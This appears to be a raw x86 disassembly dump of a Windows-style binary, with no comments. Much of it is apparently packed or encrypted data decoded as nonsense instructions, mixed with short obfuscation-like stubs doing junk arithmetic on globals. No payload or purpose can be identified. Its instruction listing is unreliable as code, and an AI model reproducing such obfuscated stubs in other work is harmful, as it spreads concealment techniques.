  40a373:	call   0xd1b8e8f7
  40a378:	nop
  40a379:	pop    esp
  40a37a:	cmp    ch,cl
  40a37c:	test   DWORD PTR [ecx+0x569caa00],esi
  40a382:	stos   BYTE PTR es:[edi],al
  40a383:	imul   esi,DWORD PTR [esi-0x3053a503],0x3d156d9c
  40a38d:	addr16 clc 
  40a38f:	jns    0x40a317
  40a391:	or     al,0xee
  40a393:	stos   DWORD PTR es:[edi],eax
  40a394:	and    al,0x46
  40a396:	and    DWORD PTR [edi],ecx
  40a398:	ins    BYTE PTR es:[edi],dx
  40a399:	jae    0x40a34b
  40a39b:	sub    eax,0xfb22fafd
  40a3a0:	test   BYTE PTR [edx+0x19],al
  40a3a3:	dec    esi
  40a3a4:	pmullw mm0,mm6
  40a3a7:	mov    dl,0xc3
  40a3a9:	and    ebx,DWORD PTR [edi-0x7e]
  40a3ac:	sbb    cl,bl
  40a3ae:	cmp    al,0xd2
  40a3b0:	cmp    DWORD PTR [esi],edi
  40a3b2:	mov    ecx,0xa24fbd2a
  40a3b7:	xchg   esi,eax
  40a3b8:	mov    esi,0x2e127452
  40a3bd:	and    DWORD PTR [ebp+0x4576d649],esi
  40a3c3:	hlt    
  40a3c4:	mov    cs,WORD PTR [edx]
  40a3c6:	jo     0x40a37c
  40a3c8:	xor    DWORD PTR [esi-0x10a10cc3],0x743beee
  40a3d2:	std    
  40a3d3:	mov    eax,ds:0x4f9c6e30
  40a3d8:	(bad)  
  40a3d9:	call   0x37fa6142
  40a3de:	fwait
  40a3df:	dec    eax
  40a3e0:	rcl    BYTE PTR [ecx],1
  40a3e2:	ins    DWORD PTR es:[edi],dx
  40a3e3:	sbb    DWORD PTR [edi-0x48],0xffffffa4
  40a3e7:	icebp  
  40a3e8:	fldl2e 
  40a3ea:	or     BYTE PTR [edi-0x3d],bh
  40a3ed:	cli    
  40a3ee:	jo     0x40a387
  40a3f0:	cmp    BYTE PTR [edx+0x62],0x6d
  40a3f4:	pop    es
  40a3f5:	jmp    0xdc4d:0x6641fd5
  40a3fc:	jb     0x40a3ad
  40a3fe:	sti    
  40a3ff:	inc    ebp
  40a400:	add    eax,0x571bb7ea
  40a405:	adc    bl,dl
  40a407:	fimul  DWORD PTR [esi-0x10]
  40a40a:	aaa    
  40a40b:	cwde   
  40a40c:	jns    0x40a399
  40a40e:	push   ebp
  40a40f:	cld    
  40a410:	xor    edx,eax
  40a412:	adc    DWORD PTR ds:0x4335f3,0x43361f
  40a41c:	add    edx,ecx
  40a41e:	mov    DWORD PTR ds:0x43362b,0x68c0
  40a428:	cmp    edi,edx
  40a42a:	jb     0x40d767
  40a430:	mov    edx,DWORD PTR [ebp-0x28]
  40a433:	mov    edi,DWORD PTR [ebp-0x4]
  40a436:	xor    edx,eax
  40a438:	xor    ebx,ebx
  40a43a:	add    ebx,DWORD PTR ds:0x433563
  40a440:	and    DWORD PTR ds:0x43365f,ebx
  40a446:	xor    edi,eax
  40a448:	movzx  ebx,WORD PTR ds:0x433657
  40a44f:	sbb    DWORD PTR ds:0x433567,ebx
  40a455:	add    edi,ecx
  40a457:	add    DWORD PTR ds:0x4335f3,0x6da
  40a461:	add    edx,ecx
  40a463:	and    DWORD PTR ds:0x4335a7,0x0
  40a46d:	jmp    0x40a47f
  40a472:	mov    ebx,DWORD PTR ds:0x4335a7
  40a478:	inc    ebx
  40a479:	mov    DWORD PTR ds:0x4335a7,ebx
  40a47f:	cmp    DWORD PTR ds:0x4335a7,0x1c
  40a486:	jae    0x40a823
  40a48c:	cmp    DWORD PTR ds:0x4335a7,0x1e
  40a493:	jne    0x40a4a1
  40a499:	push   0x1
  40a49b:	call   DWORD PTR ds:0x412270
  40a4a1:	jmp    0x40a472
  40a4a6:	sbb    DWORD PTR ds:0x43366f,0x1f9a
  40a4b0:	jmp    0x40a823
  40a4b5:	shl    BYTE PTR [edi-0x482074c],cl
  40a4bb:	bnd jno 0x40a491
  40a4be:	lahf   
  40a4bf:	inc    edi
  40a4c0:	sbb    edx,DWORD PTR [eax-0x29]
  40a4c3:	push   es
  40a4c4:	fisttp DWORD PTR [ecx-0x35838309]
  40a4ca:	jns    0x40a548
  40a4cc:	jl     0x40a4c7
  40a4ce:	retf   0xc174
  40a4d1:	icebp  
  40a4d2:	shr    BYTE PTR [edx+0x41],0x5a
  40a4d6:	mov    edx,0x31b3a110
  40a4db:	sbb    DWORD PTR [eax-0x14],eax
  40a4de:	and    BYTE PTR [ebx-0x16],cl
  40a4e1:	(bad)  
  40a4e2:	adc    al,0x34
  40a4e4:	xor    DWORD PTR fs:[edx+ecx*2+0x45668b64],edx
  40a4ec:	inc    esi
  40a4ed:	jns    0x40a514
  40a4ef:	xor    eax,0x94df8a90
  40a4f4:	outs   dx,DWORD PTR ds:[esi]
  40a4f5:	xchg   esi,eax
  40a4f6:	jbe    0x40a4bc
  40a4f8:	in     al,dx
  40a4f9:	leave  
  40a4fa:	mov    dl,0x5a
  40a4fc:	jl     0x40a4fe
  40a4fe:	mov    ebx,0x5318d405
  40a503:	pop    ebp
  40a504:	add    eax,0x8cc6a97b
  40a509:	sub    BYTE PTR [ebp+0x63be16e1],bl
  40a50f:	sub    eax,0x5f60f336
  40a514:	adc    esi,DWORD PTR [eax+0x52]
  40a517:	jb     0x40a547
  40a519:	pop    ebx
  40a51a:	retf   0x8252
  40a51d:	xchg   BYTE PTR [edx],al
  40a51f:	push   eax
  40a520:	fs in  eax,0xe3
  40a523:	jb     0x40a539
  40a525:	xchg   edx,eax
  40a526:	dec    edi
  40a527:	out    0xea,al
  40a529:	xchg   DWORD PTR [ebx-0x71],esi
  40a52c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a52d:	mov    DWORD PTR [eax+0x27],edx
  40a530:	mov    ebp,ds
  40a532:	je     0x40a5b0
  40a534:	sbb    BYTE PTR [edi-0x40],al
  40a537:	addr16 int3 
  40a539:	nop
  40a53a:	jge    0x40a599
  40a53c:	inc    esi
  40a53d:	cmp    eax,DWORD PTR [edx-0x5f9b20e5]
  40a543:	int3   
  40a544:	ins    BYTE PTR es:[edi],dx
  40a545:	jae    0x40a552
  40a547:	sbb    DWORD PTR [ebp-0x43b6c4a8],ebp
  40a54d:	cs inc esp
  40a54f:	(bad)  
  40a551:	mov    edx,0xc4f8f317
  40a556:	arpl   cx,ax
  40a558:	dec    ecx
  40a559:	and    eax,0x16ad2774
  40a55e:	push   ds
  40a55f:	push   ebx
  40a560:	and    DWORD PTR [eax+0x7c244302],ebp
  40a566:	lea    ecx,[edx+0x31]
  40a569:	clc    
  40a56a:	out    0xfd,al
  40a56c:	mov    edx,0xfb4b2bb9
  40a571:	xchg   DWORD PTR [edi+ecx*2+0x6c07de23],ebp
  40a578:	imul   ecx,DWORD PTR [ecx],0xffffff9c
  40a57b:	ror    al,cl
  40a57d:	pop    edx
  40a57e:	ja     0x40a59f
  40a580:	in     al,dx
  40a581:	stos   DWORD PTR es:[edi],eax
  40a582:	(bad)  
  40a583:	cmc    
  40a584:	mov    eax,0x8ae145ff
  40a589:	je     0x40a5f9
  40a58b:	lods   eax,DWORD PTR ds:[esi]
  40a58c:	lods   eax,DWORD PTR ds:[esi]
  40a58d:	(bad)  
  40a58e:	push   ebx
  40a58f:	test   eax,0x605410e5
  40a594:	mov    ch,0xf0
  40a596:	mov    ch,0x41
  40a598:	stc    
  40a599:	add    BYTE PTR [edi-0x3e],ah
  40a59c:	ds (bad) 
  40a59e:	dec    edx
  40a59f:	rol    BYTE PTR [esi],0x78
  40a5a2:	mov    eax,0xb9ecc388
  40a5a7:	cmp    al,0x11
  40a5a9:	popf   
  40a5aa:	and    edx,DWORD PTR [ebp-0x66]
  40a5ad:	retf   0x7672
  40a5b0:	out    dx,eax
  40a5b1:	sbb    al,0x34
  40a5b3:	dec    esi
  40a5b4:	pusha  
  40a5b5:	and    dl,BYTE PTR [edi-0x6e000244]
  40a5bb:	xchg   bh,ah
  40a5bd:	pop    esp
  40a5be:	adc    al,0x53
  40a5c0:	mov    al,0x4d
  40a5c2:	jecxz  0x40a641
  40a5c4:	sub    al,BYTE PTR [esp+eiz*2+0x5a]
  40a5c8:	into   
  40a5c9:	dec    ebx
  40a5ca:	aad    0xa5
  40a5cc:	loopne 0x40a5c9
  40a5ce:	jecxz  0x40a612
  40a5d0:	adc    BYTE PTR [esi],ch
  40a5d2:	icebp  
  40a5d3:	call   0xebed:0x6e8be54
  40a5da:	cmp    al,0x75
  40a5dc:	xchg   esp,eax
  40a5dd:	jo     0x40a60f
  40a5df:	push   0xd2ceef4f
  40a5e4:	jle    0x40a5cd
  40a5e6:	pcmpeqw mm0,mm3
  40a5e9:	mov    dl,0x21
  40a5eb:	aas    
  40a5ec:	jecxz  0x40a5ee
  40a5ee:	cmc    
  40a5ef:	xor    ebp,DWORD PTR [edx+edi*1+0x5b]
  40a5f3:	mov    al,ds:0x2827ab12
  40a5f8:	outs   dx,DWORD PTR ds:[esi]
  40a5f9:	(bad)  [ecx+eiz*1]
  40a5fc:	push   cs
  40a5fd:	(bad)  
  40a5fe:	lock mov ?,WORD PTR [edi-0x60]
  40a602:	or     esi,DWORD PTR ds:0x92492d04
  40a608:	ja     0x40a5b5
  40a60a:	jb     0x40a622
  40a60c:	ret    
  40a60d:	mov    esi,0xbbfbf3a5
  40a612:	add    ebp,esi
  40a614:	and    BYTE PTR [ecx-0x54a300bf],ah
  40a61a:	enter  0x8f64,0xe5
  40a61e:	rol    DWORD PTR [ecx],0x2d
  40a621:	mov    DWORD PTR [ecx],edx
  40a623:	(bad)  
  40a624:	pop    esi
  40a625:	iret   
  40a626:	ins    DWORD PTR es:[edi],dx
  40a627:	xlat   BYTE PTR ds:[ebx]
  40a628:	dec    eax
  40a629:	(bad)  
  40a62a:	fst    QWORD PTR [esi-0x50863c39]
  40a630:	jne    0x40a5d3
  40a632:	xchg   DWORD PTR [ebx-0x2ee4e35],ecx
  40a638:	jns    0x40a67b
  40a63a:	cmp    BYTE PTR [eax],ch
  40a63c:	popf   
  40a63d:	cmp    al,0x7c
  40a63f:	inc    esp
  40a640:	fadd   DWORD PTR [ebp+0x1724621a]
  40a646:	sub    ecx,esi
  40a648:	out    0x27,eax
  40a64a:	stc    
  40a64b:	xchg   ebp,eax
  40a64c:	add    BYTE PTR [ecx-0x3439e200],0xac
  40a653:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a654:	loop   0x40a5e7
  40a656:	cmp    BYTE PTR [edx+ebp*2-0x20],ch
  40a65a:	mov    edi,DWORD PTR [ebx]
  40a65c:	jmp    0x3772:0x86431adc
  40a663:	outs   dx,DWORD PTR ds:[esi]
  40a664:	adc    ebp,DWORD PTR [ecx+0x36]
  40a667:	pop    eax
  40a668:	repz add DWORD PTR ds:0x8e2e6652,ebx
  40a66f:	mov    ?,ebp
  40a671:	and    edi,DWORD PTR [ebx-0x3973c43c]
  40a677:	mov    edi,0x9e145309
  40a67c:	lea    ecx,[ebx-0x62]
  40a67f:	push   0x69517f80
  40a684:	daa    
  40a685:	cmp    al,0xed
  40a687:	ds jge 0x40a709
  40a68a:	in     eax,dx
  40a68b:	loope  0x40a60d
  40a68d:	mov    edi,DWORD PTR [esi+0x33]
  40a690:	cmc    
  40a691:	call   0xff65e609
  40a696:	test   BYTE PTR [ebp+0x7a],bl
  40a699:	xlat   BYTE PTR ds:[ebx]
  40a69a:	popa   
  40a69b:	cmp    al,0x7e
  40a69d:	jne    0x40a715
  40a69f:	imul   edx,DWORD PTR [ecx-0x68],0xffffffe4
  40a6a3:	retf   0x7b73
  40a6a6:	mov    ds:0x286fa714,eax
  40a6ab:	iret   
  40a6ac:	mov    DWORD PTR [ecx],ecx
  40a6ae:	pusha  
  40a6af:	xchg   ebp,eax
  40a6b0:	repnz sbb eax,0x3dba196e
  40a6b6:	and    al,0xde
  40a6b8:	pop    eax
  40a6b9:	pop    es
  40a6ba:	jge    0xc32a80c8
  40a6c0:	fnstenv [esi]
  40a6c2:	inc    ebp
  40a6c3:	daa    
  40a6c4:	adc    dl,al
  40a6c6:	sbb    ebx,0x8
  40a6c9:	dec    ebx
  40a6ca:	sbb    DWORD PTR ss:[esi],ecx
  40a6cd:	data16 mov dl,0xb9
  40a6d0:	test   DWORD PTR [edx-0x34],0xcd9284a0
  40a6d7:	out    0xf7,eax
  40a6d9:	sub    DWORD PTR [eax],ebp
  40a6db:	push   ds
  40a6dc:	loope  0x40a698
  40a6de:	inc    eax
  40a6df:	ins    DWORD PTR es:[edi],dx
  40a6e0:	mov    BYTE PTR [ecx],cl
  40a6e2:	test   ecx,ebx
  40a6e4:	push   ebp
  40a6e5:	mov    ecx,0x7094972b
  40a6ea:	xchg   edi,esp
  40a6ec:	inc    ebp
  40a6ed:	pop    ebp
  40a6ee:	or     al,0xc6
  40a6f0:	(bad)  
  40a6f1:	out    0x56,al
  40a6f3:	ret    0x17a8
  40a6f6:	fld    TBYTE PTR [edx+eiz*1]
  40a6f9:	lahf   
  40a6fa:	inc    esp
  40a6fb:	mov    edi,0x6373cae7
  40a700:	ret    0x79a1
  40a703:	mov    WORD PTR [ebx],ss
  40a705:	jno    0x40a753
  40a707:	xor    al,0x50
  40a709:	cmp    DWORD PTR [ebp-0x2b665bd2],ecx
  40a70f:	(bad)  
  40a710:	jb     0x40a75d
  40a712:	mov    al,0x1b
  40a714:	cmp    al,0x73
  40a716:	jg     0x40a75b
  40a718:	push   edi
  40a71a:	sbb    edx,ebx
  40a71c:	mov    WORD PTR [ecx],es
  40a71e:	fisubr DWORD PTR [edi-0x1d]
  40a721:	pcmpgtw mm1,QWORD PTR [eax+0x2c]
  40a725:	push   esi
  40a726:	div    DWORD PTR [eax+0x24]
  40a729:	add    cl,al
  40a72b:	stc    
  40a72c:	inc    eax
  40a72d:	mov    fs,WORD PTR [ecx+0x37a8f067]
  40a733:	dec    ecx
  40a734:	out    0x46,eax
  40a736:	hlt    
  40a737:	rcr    dl,cl
  40a739:	cli    
  40a73a:	sbb    eax,0x59df96c4
  40a73f:	sbb    eax,DWORD PTR [esp+ebp*2]
  40a742:	icebp  
  40a743:	dec    esp
  40a744:	mov    ebx,0xaf71f6b
  40a749:	push   ecx
  40a74a:	adc    BYTE PTR [ebp-0x6f75f03a],dl
  40a750:	and    esi,DWORD PTR [eax+eax*2]
  40a753:	popa   
  40a754:	xor    ecx,DWORD PTR [ebx]
  40a756:	outs   dx,BYTE PTR ds:[esi]
  40a757:	cmc    
  40a758:	hlt    
  40a759:	and    ebp,DWORD PTR [esi]
  40a75b:	popa   
  40a75c:	lea    edx,[edx+0xd462b8b]
  40a762:	out    dx,al
  40a763:	ins    DWORD PTR es:[edi],dx
  40a764:	aam    0x6
  40a766:	sbb    al,BYTE PTR [ebx]
  40a768:	mov    WORD PTR [edx-0xb29780c],es
  40a76e:	cld    
  40a76f:	in     eax,dx
  40a770:	(bad)  
  40a772:	fcomp  QWORD PTR [edi-0x1e6df1bf]
  40a778:	sub    edi,DWORD PTR [ebp+0x450a2bf3]
  40a77e:	daa    
  40a77f:	(bad)  
  40a780:	push   ebp
  40a781:	lds    ebp,FWORD PTR [edx+eax*1]
  40a784:	mov    ds:0xa55d4329,eax
  40a789:	mov    dh,0x30
  40a78b:	jnp    0x40a784
  40a78d:	xchg   ebx,eax
  40a78e:	call   0x2e3d:0x53898b9c
  40a795:	sbb    eax,0x71121510
  40a79a:	lock pop ss
  40a79c:	es int 0x49
  40a79f:	scas   eax,DWORD PTR es:[edi]
  40a7a0:	fisttp DWORD PTR [edi-0x5a138731]
  40a7a6:	inc    ebx
  40a7a7:	loope  0x40a81a
  40a7a9:	sbb    DWORD PTR [eax+0xeccc27e],0xf2807caf
  40a7b3:	in     eax,0x1d
  40a7b5:	inc    esp
  40a7b6:	and    eax,0xfca9f1a2
  40a7bb:	into   
  40a7bc:	and    al,0x17
  40a7be:	shl    DWORD PTR [edx-0x7a],1
  40a7c1:	push   ecx
  40a7c2:	leave  
  40a7c3:	pop    edi
  40a7c4:	pop    ecx
  40a7c5:	lock shr DWORD PTR [ebp+0x34],1
  40a7c9:	fistp  QWORD PTR [eax]
  40a7cb:	xor    dh,ah
  40a7cd:	rcl    DWORD PTR [ebx-0x8],1
  40a7d0:	lods   eax,DWORD PTR ds:[esi]
  40a7d1:	arpl   WORD PTR [ecx+0x55],ax
  40a7d4:	push   esi
  40a7d5:	jl     0x40a7c8
  40a7d7:	ins    BYTE PTR es:[edi],dx
  40a7d8:	adc    eax,0x7a1a0c1f
  40a7dd:	push   edi
  40a7de:	jo     0x40a765
  40a7e0:	jae    0x40a79b
  40a7e2:	jmp    0x8ad2:0xcf70a0f3
  40a7e9:	adc    DWORD PTR [edi+0x73178cac],0xffffffa5
  40a7f0:	cdq    
  40a7f1:	ja     0x40a863
  40a7f3:	mov    ebx,0x9f8b077e
  40a7f8:	je     0x40a797
  40a7fa:	inc    ecx
  40a7fb:	xor    eax,0xd5bab0d1
  40a800:	push   edx
  40a801:	cli    
  40a802:	pop    ds
  40a803:	push   ss
  40a804:	xchg   ebx,eax
  40a805:	ret    
  40a806:	cmp    ebx,DWORD PTR [edx-0x33]
  40a809:	call   0x3bb8:0xbda85840
  40a810:	gs or  eax,0x9c95e319
  40a816:	iret   
  40a817:	mov    esp,0xb7e6ba9d
  40a81c:	icebp  
  40a81d:	xchg   eax,eax
  40a81f:	rep ins BYTE PTR es:[edi],dx
  40a821:	arpl   WORD PTR [edi+0xf],dx
  40a824:	scas   eax,DWORD PTR es:[edi]
  40a825:	xlat   BYTE PTR ds:[ebx]
  40a826:	adc    DWORD PTR ds:0x4335af,ebx
  40a82c:	mov    edi,DWORD PTR [ebp-0x8]
  40a82f:	or     DWORD PTR ds:0x4335ab,ecx
  40a835:	mov    ebx,DWORD PTR [ebp-0x10]
  40a838:	sub    ebx,edi
  40a83a:	cmp    ebx,edx
  40a83c:	mov    DWORD PTR ds:0x4335ef,0x652d
  40a846:	ja     0x40a872
  40a84c:	xor    edx,DWORD PTR ds:0x433597
  40a852:	mov    edx,DWORD PTR [ebp-0x4]
  40a855:	sbb    DWORD PTR ds:0x4335df,0x855
  40a85f:	xor    edx,eax
  40a861:	add    edx,ecx
  40a863:	mov    DWORD PTR ds:0x4335af,0x65c5
  40a86d:	jmp    0x40bab5
  40a872:	mov    ebx,DWORD PTR ds:0x433623
  40a878:	sub    ebx,DWORD PTR ds:0x43354f
  40a87e:	mov    DWORD PTR ds:0x433623,ebx
  40a884:	mov    edx,DWORD PTR [ebp-0x2c]
  40a887:	mov    edi,DWORD PTR [ebp-0x4]
  40a88a:	or     DWORD PTR ds:0x433597,ebx
  40a890:	xor    edx,eax
  40a892:	xor    edi,eax
  40a894:	movzx  ebx,BYTE PTR ds:0x433617
  40a89b:	adc    DWORD PTR ds:0x433553,ebx
  40a8a1:	add    edi,ecx
  40a8a3:	add    edx,ecx
  40a8a5:	imul   edx,edi
  40a8a8:	adc    DWORD PTR ds:0x4335a7,edi
  40a8ae:	mov    edi,DWORD PTR [ebp-0x8]
  40a8b1:	mov    ebx,DWORD PTR [ebp-0x10]
  40a8b4:	sub    ebx,edi
  40a8b6:	cmp    ebx,edx
  40a8b8:	ja     0x40a8c6
  40a8be:	mov    edx,DWORD PTR [ebp-0x28]
  40a8c1:	jmp    0x40baa7
  40a8c6:	mov    edx,DWORD PTR [ebp-0x30]
  40a8c9:	mov    edi,DWORD PTR [ebp-0x4]
  40a8cc:	xor    edx,eax
  40a8ce:	xor    edi,eax
  40a8d0:	jmp    0x40ac43
  40a8d5:	call   0x73960c99
  40a8da:	jge    0x40a8ce
  40a8dc:	pop    ecx
  40a8dd:	jno    0x40a8ff
  40a8df:	aad    0xd1
  40a8e1:	or     DWORD PTR [esi+0x42],eax
  40a8e4:	jo     0x40a94d
  40a8e6:	lock jl 0x40a965
  40a8e9:	retf   0x7c79
  40a8ec:	jl     0x40a8a2
  40a8ee:	out    dx,al
  40a8ef:	sbb    eax,0xf8c9ba1f
  40a8f4:	je     0x40a93a
  40a8f6:	pop    esp
  40a8f7:	mov    BYTE PTR [ebp-0x2a94a679],bl
  40a8fd:	push   esi
  40a8fe:	xchg   esp,eax
  40a8ff:	mov    ds:0x778e7c9f,al
  40a904:	mov    BYTE PTR [ebx+ecx*8-0x4faebc1e],al
  40a90b:	push   eax
  40a90c:	loop   0x40a8f6
  40a90e:	push   cs
  40a90f:	(bad)  
  40a910:	and    bl,BYTE PTR [ebp-0x77808071]
  40a916:	inc    ecx
  40a917:	cmc    
  40a918:	or     DWORD PTR [ebx],eax
  40a91a:	mov    ebx,0xa078fe35
  40a91f:	xor    al,0xae
  40a921:	ret    0x6d68
  40a924:	mov    eax,0x1cd7c8da
  40a929:	and    dl,bl
  40a92b:	outs   dx,DWORD PTR ds:[esi]
  40a92c:	test   BYTE PTR ds:0xfc21b2fa,al
  40a932:	retf   0xd65f
  40a935:	data16 xor al,0x98
  40a938:	mov    cl,0xb1
  40a93a:	sub    al,0xd1
  40a93c:	cwde   
  40a93d:	test   al,0x8d
  40a93f:	push   esp
  40a940:	sbb    BYTE PTR [ecx+0x6e],dh
  40a943:	cmp    eax,0x8318287a
  40a948:	mov    ds:0xb8723d2f,al
  40a94d:	pushf  
  40a94e:	adc    BYTE PTR [ecx],bh
  40a950:	scas   al,BYTE PTR es:[edi]
  40a951:	aaa    
  40a952:	jns    0x40a953
  40a954:	jmp    0x40a9ab
  40a956:	mov    fs,WORD PTR ss:0x4ca8afb9
  40a95d:	lock or BYTE PTR [ebp+0x55a91025],ah
  40a964:	ss fs imul ebx,eax,0x7142f6c2
  40a96c:	push   edx
  40a96d:	mov    ch,0x4c
  40a96f:	int    0x49
  40a971:	mov    ebx,0xd285f70e
  40a976:	imul   esi,DWORD PTR [esp+eiz*2+0x7b],0xaa29ec89
  40a97e:	test   BYTE PTR [ebx],ch
  40a980:	push   edi
  40a981:	inc    ebp
  40a982:	ins    BYTE PTR es:[edi],dx
  40a983:	adc    al,0x43
  40a985:	data16 jns 0x40a9c4
  40a988:	bound  esp,QWORD PTR [esi]
  40a98a:	(bad)  
  40a98b:	pop    edx
  40a98c:	mov    bl,BYTE PTR [edi]
  40a98e:	dec    edi
  40a98f:	leave  
  40a990:	loop   0x40a9e6
  40a992:	repnz adc BYTE PTR [ebp+0x1bad2aca],al
  40a999:	add    eax,0x6dd2be67
  40a99e:	pop    esp
  40a99f:	popa   
  40a9a0:	xchg   edx,eax
  40a9a1:	icebp  
  40a9a2:	adc    al,0xe0
  40a9a4:	push   edx
  40a9a5:	in     al,0x2b
  40a9a7:	sub    DWORD PTR [edi],esp
  40a9a9:	daa    
  40a9aa:	ret    0xbb39
  40a9ad:	pushf  
  40a9ae:	fcmovnbe st,st(7)
  40a9b0:	scas   eax,DWORD PTR es:[edi]
  40a9b1:	nop
  40a9b2:	mov    ds:0xdf185c6e,al
  40a9b7:	push   esi
  40a9b8:	inc    ebx
  40a9b9:	mov    al,ds:0x561f2a87
  40a9be:	call   0xa0396b2a
  40a9c3:	(bad)  
  40a9c5:	xchg   ecx,eax
  40a9c6:	sub    eax,0xb320a3ef
  40a9cb:	addr16 leave 
  40a9cd:	mov    bh,0x91
  40a9cf:	jnp    0x40a9a0
  40a9d1:	stc    
  40a9d2:	mov    WORD PTR [eax],fs
  40a9d4:	iret   
  40a9d5:	add    BYTE PTR [ecx-0x1ef3f8e4],cl
  40a9db:	dec    DWORD PTR [edi-0x33]
  40a9de:	retf   0x47bc
  40a9e1:	int    0xe9
  40a9e3:	pop    edi
  40a9e5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a9e6:	mov    BYTE PTR ds:0xc86a6499,bl
  40a9ec:	test   al,0xe8
  40a9ee:	dec    esp
  40a9ef:	(bad)  
  40a9f0:	fcomi  st,st(2)
  40a9f2:	sub    eax,0xcdfaafbb
  40a9f7:	ja     0x40aa33
  40a9f9:	mov    esp,0x2058c0af
  40a9fe:	cmp    DWORD PTR [edi-0x31],edx
  40aa01:	sahf   
  40aa02:	ror    DWORD PTR [ebp-0x2eb625d0],0x87
  40aa09:	stos   WORD PTR es:[edi],ax
  40aa0b:	aaa    
  40aa0c:	inc    edx
  40aa0d:	(bad)  
  40aa0e:	nop
  40aa0f:	mov    cs,edx
  40aa11:	fwait
  40aa12:	call   0x639a2d7e
  40aa17:	es and eax,0xe11b90e3
  40aa1d:	add    BYTE PTR [ebp-0x3],dl
  40aa20:	loop   0x40aa9f
  40aa22:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40aa23:	xor    esp,DWORD PTR [ebx-0x1c]
  40aa26:	js     0x40aa32
  40aa28:	je     0x40aa74
  40aa2a:	mov    ch,0xa5
  40aa2c:	mov    DWORD PTR ds:0x49430f16,esp
  40aa32:	mov    ds:0x74d0864d,al
  40aa37:	mov    dl,0x37
  40aa39:	test   DWORD PTR [edx],0xffee6f34
  40aa3f:	mov    al,0x79
  40aa41:	cli    
  40aa42:	and    eax,0xde366218
  40aa47:	outs   dx,DWORD PTR ds:[esi]
  40aa48:	dec    edi
  40aa49:	rol    DWORD PTR [eax-0x7b],0xe9
  40aa4d:	clc    
  40aa4e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40aa4f:	push   esi
  40aa50:	int    0xfe
  40aa52:	jp     0x40aa02
  40aa54:	daa    
  40aa55:	or     BYTE PTR [esi+0x44753192],al
  40aa5b:	out    dx,eax
  40aa5c:	cwde   
  40aa5d:	fisub  DWORD PTR [ebp+0x19]
  40aa60:	push   0x55
  40aa62:	or     eax,0x948ef278
  40aa67:	stc    
  40aa68:	dec    ebx
  40aa69:	fstp   st(4)
  40aa6b:	jmp    0x40aaca
  40aa6d:	mov    edi,0x22d56932
  40aa72:	ins    BYTE PTR es:[edi],dx
  40aa73:	test   al,al
  40aa75:	outs   dx,DWORD PTR ds:[esi]
  40aa76:	mov    ss,WORD PTR [ebx-0x1a]
  40aa79:	popa   
  40aa7a:	mov    esi,0x6246c4a4
  40aa7f:	xchg   ebx,eax
  40aa80:	sub    bh,BYTE PTR [ebx+0x515e137a]
  40aa86:	jmp    0x4956:0xcd7c8f1b
  40aa8d:	sub    eax,0x543a0e2d
  40aa92:	imul   edi,DWORD PTR [edi],0x7c481965
  40aa98:	test   al,0xfa
  40aa9a:	and    BYTE PTR [ebx-0x57429300],dl
  40aaa0:	mov    ah,0x54
  40aaa2:	icebp  
  40aaa3:	sbb    edx,DWORD PTR [ecx-0x6b1091d4]
  40aaa9:	add    ecx,edx
  40aaab:	mov    eax,ds:0xf765fbd2
  40aab0:	adc    edx,DWORD PTR [eax+0x7a]
  40aab3:	stos   DWORD PTR es:[edi],eax
  40aab4:	sub    al,0xb3
  40aab6:	xor    eax,0xb63fe887
  40aabb:	leave  
  40aabc:	xchg   edx,eax
  40aabd:	xchg   edi,eax
  40aabe:	test   DWORD PTR [edi],esp
  40aac0:	cmc    
  40aac1:	inc    edx
  40aac2:	fs push 0x44
  40aac5:	push   ss
  40aac6:	loopne 0x40aa7a
  40aac8:	ins    DWORD PTR es:[edi],dx
  40aac9:	pop    esp
  40aaca:	popf   
  40aacb:	dec    edi
  40aacc:	nop
  40aacd:	leave  
  40aace:	(bad)  
  40aacf:	stos   DWORD PTR es:[edi],eax
  40aad0:	push   eax
  40aad1:	dec    eax
  40aad2:	mov    bl,0x8a
  40aad4:	jnp    0x40aaf3
  40aad6:	(bad)  
  40aad7:	inc    BYTE PTR [esi]
  40aad9:	xor    dh,dl
  40aadb:	mov    esi,0x6bad3471
  40aae0:	xor    DWORD PTR [edi-0x8],esi
  40aae3:	fld1   
  40aae5:	inc    DWORD PTR [ebp+0x68]
  40aae8:	sub    ebx,DWORD PTR [edx+eiz*4-0x7795fc3]
  40aaef:	pop    esi
  40aaf0:	les    ebx,FWORD PTR [esp+ecx*4-0x26]
  40aaf4:	comiss xmm5,DWORD PTR [eax+0x21f6a5b4]
  40aafb:	pop    edx
  40aafc:	inc    esp
  40aafd:	dec    edi
  40aafe:	out    dx,eax
  40aaff:	adc    DWORD PTR [si],esp
  40ab02:	cmc    
  40ab03:	andnps xmm7,XMMWORD PTR fs:[edi]
  40ab07:	pop    eax
  40ab08:	or     BYTE PTR [ebx+ebx*4-0x75d823bc],bl
  40ab0f:	mov    al,0x20
  40ab11:	pop    edi
  40ab12:	cmp    eax,0x95ce17d8
  40ab17:	pop    ds
  40ab18:	sbb    al,0x30
  40ab1a:	test   DWORD PTR [ebx-0x7e],ebx
  40ab1d:	adc    al,0xda
  40ab1f:	pop    esp
  40ab20:	clc    
  40ab21:	es xchg edi,eax
  40ab23:	test   al,0x13
  40ab25:	mov    dh,0xb5
  40ab27:	mov    dh,0xe8
  40ab29:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ab2a:	mov    dh,BYTE PTR [ecx-0x4343ea6b]
  40ab30:	mov    esp,0x2ecc248d
  40ab35:	add    eax,0x5aa85c43
  40ab3a:	das    
  40ab3b:	xchg   ecx,eax
  40ab3c:	sbb    eax,0xca4272d3
  40ab41:	mov    bh,0x7b
  40ab43:	in     al,0xb2
  40ab45:	mov    al,0x88
  40ab47:	nop
  40ab48:	xor    ebx,ebp
  40ab4a:	hlt    
  40ab4b:	pop    ebx
  40ab4c:	mov    DWORD PTR [eax+edi*2+0x351f2ec6],eax
  40ab53:	adc    al,0xd1
  40ab55:	sbb    al,0x10
  40ab57:	retf   
  40ab58:	rcr    DWORD PTR [edx-0xc],0x2f
  40ab5c:	sar    DWORD PTR [ebp-0x6],0x14
  40ab60:	and    al,0x17
  40ab62:	dec    eax
  40ab63:	push   es
  40ab64:	and    BYTE PTR [edi+0x79],ah
  40ab67:	clc    
  40ab68:	popa   
